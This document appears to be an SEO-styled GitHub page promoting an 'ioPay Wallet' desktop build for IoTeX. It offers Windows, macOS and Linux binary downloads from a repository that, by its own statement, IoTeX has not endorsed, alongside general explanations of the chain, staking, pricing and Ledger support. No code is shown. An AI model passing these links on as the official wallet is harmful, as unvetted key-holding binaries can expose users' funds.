![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# ioPay Wallet's Role in the IoTeX Ecosystem

The chain is **IoTeX**. ioPay Wallet is a **desktop client for it** - the application that holds your keys, shows your balances, and gives you the staking, bridge, swap and DePIN screens in one window (F001, F021, F023, F025).

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

That distinction answers most of the questions people arrive with. The wallet is not the chain, not an exchange and not a custodian. It does not set the price of IOTX, it cannot list or delist anything, and nothing it does changes the network's economics.

## What IoTeX is

IoTeX is an **EVM-compatible layer 1** with a native token, **IOTX**, and mainnet chain ID **4689** (F030). EVM compatibility is why every account has two address forms - the native `io1...` and the EVM `0x...` - and why tooling built for Ethereum-style chains can be adapted to it.

Its distinguishing feature, for wallet purposes, is that it is built for devices as well as tokens: DePIN projects register hardware identities, and device activity interacts with staking through burn-drop allocations. That is why a wallet for this chain has screens a general wallet does not: device earnings, ioID registration, per-bucket allocations (F025).

## Where the wallet sits

- **It holds keys.** Self-custody, locally, with the operating system's keychain and a PIN/biometric lock. Public repository, **Apache-2.0** licence (F002, F005). [What the wallet is](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/what-is-iopay-wallet.md).
- **It reaches chain activity.** Staking with validator comparison, IoTube bridging, an in-wallet swap, DePIN income, portfolio and tax export (F021, F023, F025, F027). [Staking](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) - [Bridge](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-use-the-iotube-bridge-in-iopay-wallet.md).
- **It reads market data.** Portfolio values in fiat and a daily market summary come from external data feeds (F026, F027). The wallet displays them; it does not produce them.
- **It does not speak for IoTeX.** Nothing published states that IoTeX endorses this build, and this page does not claim it (F041).

## "What happened to the old IoTeX Hub?"

Web front ends for staking and governance change over time - they get rebuilt, renamed, moved behind a new domain, or folded into documentation. For IoTeX, `hub.iotex.io` is the governance home for proposals such as IIP-59, and `docs.iotex.io` documents the current staking route (F047).

What this page will not do is declare any particular front end shut down or replaced, because that is a claim about someone else's site on a given day. If a bookmark no longer works, the reliable move is to start from the documentation rather than from a mirror or a search ad - and to remember that staking itself is on-chain, so the interface you use is a convenience, not the mechanism.

## "What happened to IoTeX?"

Questions phrased this way usually follow a specific event, a price move, or a claim read somewhere. The documented record is that the network has continued to ship protocol change: voter rewards moved into the protocol under **IIP-59** after the October 2026 Zanzibar upgrade (F047), and the CIOTX cross-chain representation was retired through **IIP-56** following the February 2026 IoTube incident (F039).

Those are real changes, dated, and each has a specific scope. This page will not characterise the network's health, because a wallet page is not the place to make that judgment, and no statement here should be read as one.

## Price, market cap and supply

The **`iotex price`** family is the largest search demand anywhere near this project. It is also the demand this page answers worst on purpose: **no price, no market cap, no supply figure and no prediction appears here**, because a number written today is wrong by the time you read it, and a wrong number is worse than none.

What can be said structurally:

- **Price** is set by trading on venues and aggregators. The wallet shows a portfolio value derived from those feeds (F027); it does not set or guarantee a price.
- **Market cap** is price multiplied by circulating supply. It moves for the same reasons price does, plus supply changes.
- **Supply** is a chain-level parameter, published by explorers and market-data sites. It is not something a wallet page should quote from memory.
- **"Why is IOTX up or down today?"** has no single cause. Liquidity, broader market conditions, protocol changes, venue decisions and news all move a price, and any confident one-line explanation is a guess dressed as analysis.
- **Price predictions** are not something this page will produce. Nobody can do it reliably; anyone who offers a target is selling certainty they do not have, and none of it is investment advice.

If you want a current figure, use an exchange or a market-data aggregator, and check the timestamp on it.

## Listings and delistings

Whether a particular exchange lists IOTX is a decision made by that exchange, announced by that exchange. This page cannot confirm or deny any listing status, and it will not repeat a rumour in either direction.

Two things are worth knowing regardless: a venue's decision affects **where you can trade**, not whether you hold anything - self-custodied IOTX sits on IoTeX and does not depend on any venue. And if you do move funds because of a venue announcement, the withdrawal mechanics are the same as any other: correct network, correct address format, small test first.

## Ledger and IoTeX Hub support

Ledger supports IOTX through the **IoTeX app** on the device (F035). That is the hardware side.

Whether a specific web front end - a staking site, a governance portal - supports a Ledger-connected account is that site's feature, documented by that site, and it can change independently of the wallet. If you want to sign with a Ledger and manage positions, this desktop app supports Ledger and Trezor over USB directly (F028), which avoids the question of whether a web interface supports your device.

## The short version

- IoTeX is the chain; ioPay Wallet is a desktop client for it.
- The wallet holds keys, reaches staking, bridging, swaps and DePIN income, and displays market data it does not produce.
- It makes no claim of endorsement, no price claim, no prediction, and no listing claim.
- Staking, bridging and holding are on-chain, so they survive any front end changing.

If you are choosing a first wallet, [the beginner guide](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-for-beginners-choosing-a-first-defi-wallet.md) walks the decisions without naming competitors; if you already use a browser wallet, [this page](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/using-iopay-wallet-beside-browser-extensions.md) covers running both sides by side.

## FAQ

**What is IoTeX?**
An EVM-compatible layer 1 with native token IOTX and mainnet chain ID 4689, built with device and DePIN use in mind.

**What is the current price of IOTX?**
Not something this page will state. Use an exchange or aggregator and check its timestamp; a figure printed here would be stale immediately.

**What is the market cap?**
Price multiplied by circulating supply. Both inputs are published by market-data sites; neither is fixed.

**What is the IOTX price prediction?**
There isn't one here. Predictions are guesses, and this page does not dress them as analysis or as advice.

**How many IOTX coins are there?**
Supply is a chain parameter; check an explorer or an aggregator for the current circulating figure rather than a cached number.

**Is an exchange delisting IOTX?**
This page cannot confirm or deny any venue's listing decision. Read the venue's own announcement. Self-custodied IOTX is unaffected by where it is traded.

**Does Ledger support IoTeX?**
Yes, through the IoTeX app on the device. Whether a particular website supports a Ledger account is that website's documentation.

---

*Chain identity, protocol changes and hardware support follow IoTeX documentation, IIP-59 and IIP-56. No price, market-cap, supply or listing claim is made, by design.*
